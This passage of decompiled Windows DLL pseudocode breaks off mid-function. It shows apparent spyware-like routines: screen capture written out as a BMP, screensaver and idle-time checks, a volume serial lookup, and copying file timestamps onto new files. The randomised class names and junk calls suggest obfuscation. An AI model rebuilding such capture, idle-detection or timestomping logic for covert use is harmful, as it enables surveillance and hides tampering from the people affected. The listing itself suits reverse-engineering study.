    if ( !GetWindowRect(*(HWND *)(this + 4), &Rect) )
    {
      sub_1000E2E3(v7, 1);
      _CxxThrowException(v7, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  else
  {
    if ( *(_DWORD *)(this + 64) != 2 )
    {
      sub_10019322(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVBpqonlefcdQdwemTtnqbpqon_kzwdu_sr__);
    }
    if ( !GetClientRect(*(HWND *)(this + 4), &Rect) )
    {
      sub_1000E2E3(v8, 1);
      _CxxThrowException(v8, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  sub_100193A0(this, &Rect);
  v3 = (int *)(*(int (__thiscall **)(int, int *))(*(_DWORD *)(this + 24) + 36))(this + 24, v5);
  LOBYTE(v10) = 1;
  sub_1000C439(v3, a2);
  LOBYTE(v10) = 0;
  return sub_1000C45D(v5);
}
// 10019241: using guessed type _DWORD pExceptionObject[4];
// 10019241: using guessed type _DWORD var_24[3];
// 10019241: using guessed type _DWORD var_30[3];
// 10019241: using guessed type int var_54[5];

//----- (10019322) --------------------------------------------------------
_DWORD *__stdcall sub_10019322(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_10073DF0;
  return a1;
}
// 10073DF0: using guessed type int (__thiscall *off_10073DF0)(void *Block, char);

//----- (100193A0) --------------------------------------------------------
char __stdcall sub_100193A0(int a1, _DWORD *cy)
{
  HDC DC; // eax
  int *p_pExceptionObject; // eax
  HDC CompatibleDC; // eax
  int v5; // edi
  HBITMAP CompatibleBitmap; // eax
  _ThrowInfo *v8; // [esp-4h] [ebp-50h]
  _DWORD v9[3]; // [esp+10h] [ebp-3Ch] BYREF
  int v10; // [esp+1Ch] [ebp-30h] BYREF
  HDC hdc; // [esp+20h] [ebp-2Ch]
  int v12; // [esp+24h] [ebp-28h]
  int v13; // [esp+28h] [ebp-24h] BYREF
  int v14; // [esp+2Ch] [ebp-20h] BYREF
  int v15; // [esp+30h] [ebp-1Ch] BYREF
  int pExceptionObject; // [esp+34h] [ebp-18h] BYREF
  HGDIOBJ h; // [esp+38h] [ebp-14h]
  int v18; // [esp+48h] [ebp-4h]
  int cya; // [esp+58h] [ebp+Ch]

  GetCurrentProcessId();
  GetCurrentProcessId();
  DC = GetDC(*(HWND *)(a1 + 4));
  sub_10025E7D((int)DC, &v10);
  v18 = 0;
  if ( !hdc )
  {
    sub_1000DEEF(&pExceptionObject);
    v8 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &pExceptionObject;
    goto LABEL_3;
  }
  GetCurrentProcessId();
  GetCurrentProcessId();
  CompatibleDC = CreateCompatibleDC(hdc);
  sub_1001977B(a1 + 8, (int)CompatibleDC);
  if ( !*(_DWORD *)(a1 + 12) )
  {
    sub_1000DEEF(&v15);
    v8 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &v15;
    goto LABEL_3;
  }
  v12 = cy[2] - *cy;
  v5 = v12;
  cya = cy[3] - cy[1];
  GetCurrentProcessId();
  GetCurrentProcessId();
  CompatibleBitmap = CreateCompatibleBitmap(hdc, v5, cya);
  sub_100197E1(a1 + 16, (int)CompatibleBitmap);
  if ( !*(_DWORD *)(a1 + 20) )
  {
    sub_1000DEEF(&v14);
    v8 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &v14;
    goto LABEL_3;
  }
  h = SelectObject(*(HDC *)(a1 + 12), *(HGDIOBJ *)(a1 + 20));
  if ( !h )
  {
    sub_1000DEEF(&v13);
    v8 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = &v13;
    goto LABEL_3;
  }
  LOBYTE(v18) = 1;
  if ( !BitBlt(*(HDC *)(a1 + 12), 0, 0, v12, cya, hdc, 0, 0, 0xCC0020u) )
  {
    sub_1000E2E3(v9, 1);
    v8 = (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__;
    p_pExceptionObject = v9;
LABEL_3:
    _CxxThrowException(p_pExceptionObject, v8);
  }
  sub_10019606((_DWORD *)a1);
  v18 = 0;
  SelectObject(*(HDC *)(a1 + 12), h);
  v18 = -1;
  return sub_10019719(&v10);
}
// 100193A0: using guessed type _DWORD var_3C[3];

//----- (10019515) --------------------------------------------------------
_DWORD *__userpurge sub_10019515@<eax>(int a1@<esi>, _DWORD *a2)
{
  int v2; // ecx
  _DWORD *v3; // eax
  int v4; // ecx
  int v5; // eax
  int pv; // [esp+10h] [ebp-3Ch] BYREF
  int v8; // [esp+14h] [ebp-38h]
  int v9; // [esp+18h] [ebp-34h]
  int v10; // [esp+1Ch] [ebp-30h]
  int v11; // [esp+20h] [ebp-2Ch]
  int v12; // [esp+24h] [ebp-28h]
  int v13[2]; // [esp+28h] [ebp-24h] BYREF
  _DWORD pExceptionObject[3]; // [esp+30h] [ebp-1Ch] BYREF
  int v15; // [esp+3Ch] [ebp-10h]
  int v16; // [esp+48h] [ebp-4h]

  v16 = 0;
  v15 = 0;
  pv = 0;
  v8 = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  if ( !GetObjectA(*(HANDLE *)(a1 + 20), 24, &pv) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_1000C28D((void *)0x28, (int)a2, 0);
  v16 = 0;
  v2 = *(_DWORD *)(a1 + 60);
  v15 = 1;
  if ( v2 != 24 )
  {
    v3 = (_DWORD *)sub_1000C28D((void *)(4 * (1 << v2)), (int)v13, 0);
    v16 = 1;
    sub_1000C5DF(v3, (int)a2);
    LOBYTE(v16) = 0;
    sub_1000C45D(v13);
  }
  v4 = sub_1000C52E(a2);
  *(_DWORD *)v4 = 40;
  *(_DWORD *)(v4 + 4) = v8;
  *(_DWORD *)(v4 + 8) = v9;
  *(_WORD *)(v4 + 12) = 1;
  *(_WORD *)(v4 + 14) = *(_WORD *)(a1 + 60);
  v5 = *(_DWORD *)(v4 + 8) * *(unsigned __int16 *)(v4 + 14) * ((*(_DWORD *)(v4 + 4) + 7) / 8);
  *(_DWORD *)(v4 + 16) = 0;
  *(_DWORD *)(v4 + 20) = v5;
  *(_DWORD *)(v4 + 32) = 0;
  *(_DWORD *)(v4 + 36) = 0;
  return a2;
}
// 10019515: using guessed type _DWORD pExceptionObject[3];

//----- (10019606) --------------------------------------------------------
LONG __thiscall sub_10019606(_DWORD *this)
{
  int v2; // edi
  HDC v3; // ebx
  void *v4; // eax
  HBITMAP v5; // edx
  int v6; // edi
  int v7; // edi
  int v8; // eax
  _DWORD *v9; // esi
  int v11[5]; // [esp+10h] [ebp-58h] BYREF
  int v12[5]; // [esp+24h] [ebp-44h] BYREF
  int v13[3]; // [esp+38h] [ebp-30h] BYREF
  int v14; // [esp+44h] [ebp-24h]
  _DWORD pExceptionObject[3]; // [esp+4Ch] [ebp-1Ch] BYREF
  int v16; // [esp+58h] [ebp-10h]
  int v17; // [esp+64h] [ebp-4h]

  sub_10019515((int)this, v13);
  v17 = 0;
  v2 = sub_1000C52E(v13);
  sub_1000C28D(*(void **)(v2 + 20), (int)v11, 0);
  LOBYTE(v17) = 1;
  v3 = (HDC)this[3];
  v4 = (void *)sub_1000C52E(v11);
  if ( !GetDIBits(v3, v5, 0, *(_DWORD *)(v2 + 8), v4, (LPBITMAPINFO)v2, 0) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  v6 = *(_DWORD *)(v2 + 20);
  v16 = v14 + 14;
  v7 = v14 + 14 + v6;
  sub_1000C28D((void *)0xE, (int)v12, 0);
  LOBYTE(v17) = 2;
  v8 = sub_1000C52E(v12);
  *(_DWORD *)(v8 + 10) = v16;
  v9 = this + 6;
  *(_WORD *)v8 = 19778;
  *(_DWORD *)(v8 + 2) = v7;
  *(_WORD *)(v8 + 6) = 0;
  *(_WORD *)(v8 + 8) = 0;
  (*(void (__thiscall **)(_DWORD *, int *))(*v9 + 12))(v9, v12);
  (*(void (__thiscall **)(_DWORD *, int *))(*v9 + 12))(v9, v13);
  (*(void (__thiscall **)(_DWORD *, int *))(*v9 + 12))(v9, v11);
  LOBYTE(v17) = 1;
  sub_1000C45D(v12);
  LOBYTE(v17) = 0;
  sub_1000C45D(v11);
  v17 = -1;
  return sub_1000C45D(v13);
}
// 10019656: variable 'v5' is possibly undefined
// 10019606: using guessed type int var_30[3];
// 10019606: using guessed type int var_58[5];
// 10019606: using guessed type _DWORD pExceptionObject[3];
// 10019606: using guessed type int var_44[5];

//----- (10019719) --------------------------------------------------------
char __thiscall sub_10019719(_DWORD *this)
{
  *this = off_10073DE0;
  return sub_10019873((int)this);
}
// 10073DE0: using guessed type int (__thiscall *off_10073DE0[5])(void *Block, char);

//----- (1001974A) --------------------------------------------------------
char __thiscall sub_1001974A(_DWORD *this)
{
  *this = off_10073DE4;
  return sub_1001988D((int)this);
}
// 10073DE4: using guessed type int (__thiscall *off_10073DE4[4])(void *Block, char);

//----- (1001977B) --------------------------------------------------------
char __usercall sub_1001977B@<al>(int a1@<eax>, int a2@<edi>)
{
  int v2; // esi
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  v2 = a1;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(a1) = sub_1001988D(a1);
    if ( !(_BYTE)a1 )
    {
      sub_1000E2E3(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  *(_DWORD *)(v2 + 4) = a2;
  return a1;
}
// 1001977B: using guessed type _DWORD pExceptionObject[3];

//----- (100197B0) --------------------------------------------------------
char __thiscall sub_100197B0(_DWORD *this)
{
  *this = off_10073DE8;
  return sub_100198A6((int)this);
}
// 10073DE8: using guessed type int (__thiscall *off_10073DE8[3])(void *Block, char);

//----- (100197E1) --------------------------------------------------------
char __usercall sub_100197E1@<al>(int a1@<eax>, int a2@<edi>)
{
  int v2; // esi
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  v2 = a1;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(a1) = sub_100198A6(a1);
    if ( !(_BYTE)a1 )
    {
      sub_1000E2E3(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  *(_DWORD *)(v2 + 4) = a2;
  return a1;
}
// 100197E1: using guessed type _DWORD pExceptionObject[3];

//----- (10019816) --------------------------------------------------------
_DWORD *__thiscall sub_10019816(_DWORD *Block, char a2)
{
  sub_10019719(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10019835) --------------------------------------------------------
_DWORD *__thiscall sub_10019835(_DWORD *Block, char a2)
{
  sub_1001974A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10019854) --------------------------------------------------------
_DWORD *__thiscall sub_10019854(_DWORD *Block, char a2)
{
  sub_100197B0(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10019873) --------------------------------------------------------
char __usercall sub_10019873@<al>(int a1@<esi>)
{
  char result; // al

  if ( !sub_100198BF(a1) )
    return 1;
  result = sub_10025E91((HDC *)a1);
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}

//----- (1001988D) --------------------------------------------------------
char __usercall sub_1001988D@<al>(int a1@<esi>)
{
  char result; // al

  if ( !sub_100198D2(a1) )
    return 1;
  result = sub_10025EE8(a1);
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}

//----- (100198A6) --------------------------------------------------------
char __usercall sub_100198A6@<al>(int a1@<esi>)
{
  char result; // al

  if ( !sub_100198E5(a1) )
    return 1;
  result = sub_10025F38(a1);
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}

//----- (100198BF) --------------------------------------------------------
BOOL __usercall sub_100198BF@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 && v1 != -1;
}

//----- (100198D2) --------------------------------------------------------
BOOL __usercall sub_100198D2@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 && v1 != -1;
}

//----- (100198E5) --------------------------------------------------------
BOOL __usercall sub_100198E5@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 && v1 != -1;
}

//----- (10019969) --------------------------------------------------------
char sub_10019969()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-10h] BYREF
  int pvParam; // [esp+Ch] [ebp-4h] BYREF

  pvParam = 0;
  if ( !SystemParametersInfoA(0x10u, 0, &pvParam, 0) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  if ( pvParam == 1 && sub_1000F73F() == 6 )
    return sub_100199C0();
  else
    return pvParam == 1;
}
// 10019969: using guessed type _DWORD pExceptionObject[3];

//----- (100199C0) --------------------------------------------------------
char sub_100199C0()
{
  char v0; // bl
  HKEY phkResult; // [esp+4h] [ebp-4h] BYREF

  v0 = 0;
  phkResult = 0;
  if ( !RegOpenKeyExW(HKEY_CURRENT_USER, *(LPCWSTR *)(dword_10095558 + 12), 0, 1u, &phkResult)
    && !RegQueryValueExW(phkResult, *(LPCWSTR *)(dword_10095550 + 12), 0, 0, 0, 0) )
  {
    v0 = 1;
  }
  RegCloseKey(phkResult);
  return v0;
}
// 10095550: using guessed type int dword_10095550;
// 10095558: using guessed type int dword_10095558;

//----- (10019AD5) --------------------------------------------------------
_DWORD *__stdcall sub_10019AD5(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_10073DF8;
  return a1;
}
// 10073DF8: using guessed type int (__thiscall *off_10073DF8)(void *Block, char);

//----- (10019C25) --------------------------------------------------------
DWORD sub_10019C25()
{
  int v0; // ecx
  int v2; // [esp-8h] [ebp-54h] BYREF
  int v3; // [esp-4h] [ebp-50h]
  int v4[6]; // [esp+0h] [ebp-4Ch] BYREF
  _DWORD pExceptionObject[3]; // [esp+18h] [ebp-34h] BYREF
  int v6[2]; // [esp+24h] [ebp-28h] BYREF
  char *v7; // [esp+2Ch] [ebp-20h]
  void *v8; // [esp+30h] [ebp-1Ch]
  void *v9; // [esp+34h] [ebp-18h]
  int v10; // [esp+48h] [ebp-4h]

  v10 = 0;
  v9 = v4;
  sub_10009F32(v4, (int)&unk_10095574);
  LOBYTE(v10) = 1;
  v3 = v0;
  v2 = v0;
  v8 = &v2;
  sub_10009F32(&v2, (int)&unk_1009556C);
  LOBYTE(v10) = 0;
  v7 = sub_100265E5(v2, v3, v4[0]);
  v10 = -1;
  v6[0] = 8;
  if ( !((int (__cdecl *)(int *))v7)(v6) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return GetTickCount() - v6[1];
}
// 10019C4B: variable 'v0' is possibly undefined
// 10019C25: using guessed type _DWORD pExceptionObject[3];

//----- (10019D5C) --------------------------------------------------------
_DWORD *__stdcall sub_10019D5C(_DWORD *a1)
{
  sub_10019FEC((int)a1);
  *a1 = &off_10073E00;
  sub_1000C28D(0, (int)(a1 + 2), 0);
  a1[7] = 0;
  a1[8] = 0;
  return a1;
}
// 10073E00: using guessed type int (__thiscall *off_10073E00)(void *Block, char);

//----- (10019DA0) --------------------------------------------------------
void *__thiscall sub_10019DA0(void *Block, char a2)
{
  sub_10019DBF((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10019DBF) --------------------------------------------------------
int __thiscall sub_10019DBF(int this)
{
  *(_DWORD *)this = &off_10073E00;
  sub_1001A081((_BYTE *)this);
  sub_1000C45D((int *)(this + 8));
  return sub_1001A03A((_BYTE *)this);
}
// 10073E00: using guessed type int (__thiscall *off_10073E00)(void *Block, char);

//----- (10019E17) --------------------------------------------------------
unsigned int __thiscall sub_10019E17(_DWORD *this, char a2)
{
  unsigned int result; // eax

  if ( this[8] == this[7] )
    (*(void (__thiscall **)(_DWORD *, int))(*this + 40))(this, 1);
  *(_BYTE *)sub_1000C55B((int)(this + 2), this[8]) = a2;
  result = ++this[8];
  if ( result > this[7] )
    this[7] = result;
  return result;
}

//----- (10019E4F) --------------------------------------------------------
int __thiscall sub_10019E4F(_DWORD *this, _DWORD *a2)
{
  unsigned int v3; // edi
  unsigned int v4; // eax
  int v5; // eax
  int result; // eax
  bool v7; // cc
  const void *v8; // [esp-8h] [ebp-14h]
  size_t v9; // [esp-4h] [ebp-10h]

  v3 = this[8] + a2[3];
  v4 = this[7];
  if ( v3 > v4 )
    (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 40))(this, v3 - v4);
  v9 = a2[3];
  v8 = (const void *)sub_1000C52E(a2);
  v5 = sub_1000C50A(this + 2);
  memcpy((void *)(this[8] + v5), v8, v9);
  result = this[3];
  *(_BYTE *)(result + 8) = 1;
  v7 = v3 <= this[7];
  this[8] = v3;
  if ( !v7 )
    this[7] = v3;
  return result;
}

//----- (10019EAB) --------------------------------------------------------
int __thiscall sub_10019EAB(int *this, int a2)
{
  sub_1000C709(this[7], this + 2, a2, 0);
  return a2;
}

//----- (10019EE1) --------------------------------------------------------
int __thiscall sub_10019EE1(_DWORD *this)
{
  return this[8];
}

//----- (10019EE5) --------------------------------------------------------
int __thiscall sub_10019EE5(_DWORD *this, int a2, int a3)
{
  int v3; // eax
  int result; // eax
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  v3 = 0;
  if ( a3 )
  {
    if ( a3 == 1 )
    {
      v3 = this[8];
    }
    else if ( a3 == 2 )
    {
      v3 = this[7];
    }
  }
  else
  {
    v3 = 0;
  }
  result = a2 + v3;
  if ( result < 0 || result > this[7] )
  {
    sub_1000E01D(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  this[8] = result;
  return result;
}
// 10019EE5: using guessed type _DWORD pExceptionObject[2];

//----- (10019F30) --------------------------------------------------------
char *__thiscall sub_10019F30(_DWORD *this, char *a2)
{
  int *v3; // eax
  char *result; // eax
  int v5[7]; // [esp+10h] [ebp-20h] BYREF
  int v6; // [esp+2Ch] [ebp-4h]

  if ( !this[7] )
  {
    v3 = (int *)sub_1000C28D(a2, (int)v5, 0);
    v6 = 0;
    sub_1000C439(v3, (int)(this + 2));
    v6 = -1;
    sub_1000C45D(v5);
  }
  while ( 1 )
  {
    result = &a2[this[7]];
    if ( (unsigned int)result <= this[5] )
      break;
    (*(void (__thiscall **)(_DWORD *))(*this + 44))(this);
  }
  return result;
}
// 10019F30: using guessed type int var_20[7];

//----- (10019F87) --------------------------------------------------------
LONG __thiscall sub_10019F87(_DWORD *this)
{
  void *v2; // eax
  const void *v4; // [esp-8h] [ebp-38h]
  size_t v5; // [esp-4h] [ebp-34h]
  int v6[7]; // [esp+10h] [ebp-20h] BYREF
  int v7; // [esp+2Ch] [ebp-4h]

  sub_1000C28D((void *)(2 * this[5]), (int)v6, 0);
  v7 = 0;
  v5 = this[7];
  v4 = (const void *)sub_1000C52E(this + 2);
  v2 = (void *)sub_1000C50A(v6);
  memcpy(v2, v4, v5);
  *(_BYTE *)(v6[1] + 8) = 1;
  sub_1000C439(v6, (int)(this + 2));
  v7 = -1;
  return sub_1000C45D(v6);
}

//----- (10019FE9) --------------------------------------------------------
char sub_10019FE9()
{
  return 1;
}

//----- (10019FEC) --------------------------------------------------------
int __stdcall sub_10019FEC(int a1)
{
  int result; // eax

  result = a1;
  *(_DWORD *)a1 = &off_10074AD0;
  *(_DWORD *)a1 = &off_10073E30;
  *(_BYTE *)(a1 + 4) = 0;
  return result;
}
// 10073E30: using guessed type int (__thiscall *off_10073E30)(void *Block, char);
// 10074AD0: using guessed type int (__thiscall *off_10074AD0)(void *Block, char);

//----- (1001A01B) --------------------------------------------------------
_BYTE *__thiscall sub_1001A01B(_BYTE *Block, char a2)
{
  sub_1001A03A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001A03A) --------------------------------------------------------
int __thiscall sub_1001A03A(_BYTE *this)
{
  int result; // eax

  *(_DWORD *)this = &off_10073E30;
  result = sub_1001A081(this);
  *(_DWORD *)this = &off_10074AD0;
  return result;
}
// 10073E30: using guessed type int (__thiscall *off_10073E30)(void *Block, char);
// 10074AD0: using guessed type int (__thiscall *off_10074AD0)(void *Block, char);

//----- (1001A081) --------------------------------------------------------
int __thiscall sub_1001A081(_BYTE *this)
{
  int result; // eax

  result = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 28))(this);
  if ( !(_BYTE)result )
    this[4] = 1;
  return result;
}

//----- (1001A094) --------------------------------------------------------
char __thiscall sub_1001A094(_BYTE *this)
{
  return this[4];
}

//----- (1001A098) --------------------------------------------------------
int __thiscall sub_1001A098(void *this, _DWORD *a2)
{
  unsigned int v2; // ebx
  unsigned int i; // edi
  int result; // eax

  v2 = a2[3];
  for ( i = 0; i < v2; ++i )
    result = (*(int (__thiscall **)(void *, _DWORD))(*(_DWORD *)this + 16))(
               this,
               *(unsigned __int8 *)(a2[2] + *(_DWORD *)(a2[1] + 12) + i));
  return result;
}

//----- (1001A0E1) --------------------------------------------------------
void __cdecl sub_1001A0E1(int a1, int a2)
{
  int *v2; // ecx
  int *v3; // esi
  _DWORD *v4; // eax
  int v5; // edi
  const WCHAR *v6; // edi
  WCHAR *v7; // eax
  int pExceptionObject; // [esp+10h] [ebp-28h] BYREF
  int v9[2]; // [esp+14h] [ebp-24h] BYREF
  int v10; // [esp+1Ch] [ebp-1Ch] BYREF
  int v11; // [esp+20h] [ebp-18h] BYREF
  DWORD VolumeSerialNumber; // [esp+24h] [ebp-14h] BYREF
  char v13; // [esp+2Bh] [ebp-Dh]
  int v14; // [esp+34h] [ebp-4h]

  v3 = v2;
  v4 = sub_10009D9C(50, v9);
  v14 = 0;
  sub_100021B1(v4 + 1, v3 + 1);
  v14 = -1;
  sub_10009F65(v9);
  v5 = v3[1];
  VolumeSerialNumber = 0;
  v13 = *(_BYTE *)(v5 + 8);
  v6 = *(const WCHAR **)(*(_DWORD *)(a1 + 4) + 12);
  v7 = (WCHAR *)sub_1000A1E4(v3);
  if ( !GetVolumeInformationW(v6, v7, 0x32u, &VolumeSerialNumber, 0, 0, 0, 0) )
  {
    sub_1000E2E3(&pExceptionObject, 1);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  if ( v13 )
    sub_1000A223((int)v3);
  sub_1000B9A0(&v10, &word_1008EF04);
  v14 = 1;
  sub_1000A28F((int)&v10, asc_1008EF08, VolumeSerialNumber);
  sub_100021B1(&v11, (int *)(a2 + 4));
  v14 = -1;
  sub_1000BA51(&v10);
}
// 1001A0ED: variable 'v2' is possibly undefined

//----- (1001A1AE) --------------------------------------------------------
int *__cdecl sub_1001A1AE(int *a1, int a2)
{
  const WCHAR *v2; // ebx
  WCHAR *v3; // eax
  unsigned int LongPathNameW; // edi
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-20h] BYREF
  int v7; // [esp+20h] [ebp-10h]
  int v8; // [esp+2Ch] [ebp-4h]

  v7 = 0;
  sub_10009D9C(260, a1);
  v8 = 0;
  v2 = *(const WCHAR **)(*(_DWORD *)(a2 + 4) + 12);
  v7 = 1;
  v3 = (WCHAR *)sub_1000A1E4(a1);
  LongPathNameW = GetLongPathNameW(v2, v3, 0x104u);
  if ( !LongPathNameW || LongPathNameW != sub_1000A1F9((int)a1) )
  {
    sub_1002D306(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
  }
  sub_1000A223((int)a1);
  sub_1000A8F8(LongPathNameW, a1);
  return a1;
}
// 1001A1AE: using guessed type _DWORD pExceptionObject[4];

//----- (1001A232) --------------------------------------------------------
int *__cdecl sub_1001A232(int *a1, int a2)
{
  const WCHAR *v2; // ebx
  WCHAR *v3; // eax
  unsigned int ShortPathNameW; // edi
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-20h] BYREF
  int v7; // [esp+20h] [ebp-10h]
  int v8; // [esp+2Ch] [ebp-4h]

  v7 = 0;
  sub_10009D9C(260, a1);
  v8 = 0;
  v2 = *(const WCHAR **)(*(_DWORD *)(a2 + 4) + 12);
  v7 = 1;
  v3 = (WCHAR *)sub_1000A1E4(a1);
  ShortPathNameW = GetShortPathNameW(v2, v3, 0x104u);
  if ( !ShortPathNameW || ShortPathNameW != sub_1000A1F9((int)a1) )
  {
    sub_1002D306(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
  }
  sub_1000A223((int)a1);
  sub_1000A8F8(ShortPathNameW, a1);
  return a1;
}
// 1001A232: using guessed type _DWORD pExceptionObject[4];

//----- (1001A2B6) --------------------------------------------------------
int *__cdecl sub_1001A2B6(int *a1, int a2)
{
  const WCHAR *v2; // ebx
  WCHAR *v3; // eax
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-24h] BYREF
  LPWSTR FilePart; // [esp+20h] [ebp-14h] BYREF
  int v7; // [esp+24h] [ebp-10h]
  int v8; // [esp+30h] [ebp-4h]

  v7 = 0;
  sub_10009D9C(260, a1);
  v8 = 0;
  v2 = *(const WCHAR **)(*(_DWORD *)(a2 + 4) + 12);
  v7 = 1;
  v3 = (WCHAR *)sub_1000A1E4(a1);
  if ( !GetFullPathNameW(v2, 0x104u, v3, &FilePart) )
  {
    sub_1002D306(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
  }
  sub_1000A223((int)a1);
  return a1;
}
// 1001A2B6: using guessed type _DWORD pExceptionObject[4];

//----- (1001A327) --------------------------------------------------------
bool __usercall sub_1001A327@<al>(int a1@<eax>)
{
  return GetFileAttributesW(*(LPCWSTR *)(*(_DWORD *)(a1 + 4) + 12)) != -1;
}

//----- (1001A33E) --------------------------------------------------------
bool __cdecl sub_1001A33E(int a1)
{
  bool v1; // bl
  DWORD FileAttributesW; // eax
  int v4; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-10h]
  int v6; // [esp+20h] [ebp-4h]

  sub_1000BA21(&v4, a1);
  v1 = 0;
  v6 = 0;
  if ( *(_WORD *)sub_1000A0AA(&v4, *(_DWORD *)(v5 + 28) - 1) == 92 )
    sub_1000A8F8(*(_DWORD *)(v5 + 28) - 1, &v4);
  FileAttributesW = GetFileAttributesW(*(LPCWSTR *)(v5 + 12));
  if ( FileAttributesW != -1 )
    v1 = (FileAttributesW & 0x10) != 0;
  v6 = -1;
  sub_1000BA51(&v4);
  return v1;
}

//----- (1001A401) --------------------------------------------------------
void __cdecl sub_1001A401(int a1, int a2)
{
  DWORD v2; // esi
  volatile LONG *v3; // ecx
  volatile LONG *v4; // [esp+0h] [ebp-B8h] BYREF
  volatile LONG *v5; // [esp+4h] [ebp-B4h]
  int v6[20]; // [esp+18h] [ebp-A0h] BYREF
  int v7[10]; // [esp+68h] [ebp-50h] BYREF
  FILETIME v8; // [esp+90h] [ebp-28h] BYREF
  FILETIME v9; // [esp+98h] [ebp-20h] BYREF
  FILETIME v10; // [esp+A0h] [ebp-18h] BYREF
  int *v11; // [esp+A8h] [ebp-10h]
  int v12; // [esp+B4h] [ebp-4h]

  v11 = (int *)&v4;
  sub_10018B3B(&v4);
  v12 = -1;
  sub_10017136(0, (int)v6, a1, (int)v4, v5);
  v12 = 1;
  v2 = sub_10018298((HANDLE *)v6);
  sub_100180DF((HANDLE *)v6, &v8, 1);
  sub_10018172((HANDLE *)v6, &v10, 1);
  sub_10018205((HANDLE *)v6, &v9, 1);
  v5 = v3;
  v4 = v3;
  v11 = (int *)&v4;
  sub_10018B3B(&v4);
  LOBYTE(v12) = 1;
  sub_10017C15(-1, 0x40000000, v7, a2, 128, 4, (int)v4, v5);
  LOBYTE(v12) = 3;
  sub_10018367(v7, 0);
  sub_10018120((HANDLE *)v7, &v8, 1);
  sub_100181B5((HANDLE *)v7, &v10, 1);
  sub_10018246((HANDLE *)v7, &v9, 1);
  sub_10018367(v7, v2);
  LOBYTE(v12) = 1;
  sub_10017D5E((int)v7);
  v12 = -1;
  sub_100171E7((HANDLE *)v6);
}
// 1001A47A: variable 'v3' is possibly undefined

//----- (1001A50B) --------------------------------------------------------
int __cdecl sub_1001A50B(int a1, unsigned int lDistanceToMove, void *a3)
{
  unsigned int v3; // ecx
  unsigned int v4; // ebx
  DWORD v5; // eax
  unsigned int v6; // esi
  __int32 v7; // eax
  int v8; // ebx
  _DWORD *v9; // eax
  int v11; // [esp+0h] [ebp-B0h] BYREF
  _ThrowInfo *v12; // [esp+4h] [ebp-ACh]
  int v13[20]; // [esp+18h] [ebp-98h] BYREF
  int v14[5]; // [esp+68h] [ebp-48h] BYREF
  DWORD NumberOfBytesRead[6]; // [esp+7Ch] [ebp-34h] BYREF
  int pExceptionObject; // [esp+94h] [ebp-1Ch] BYREF
  char v17[8]; // [esp+98h] [ebp-18h] BYREF
  int v18; // [esp+A0h] [ebp-10h]
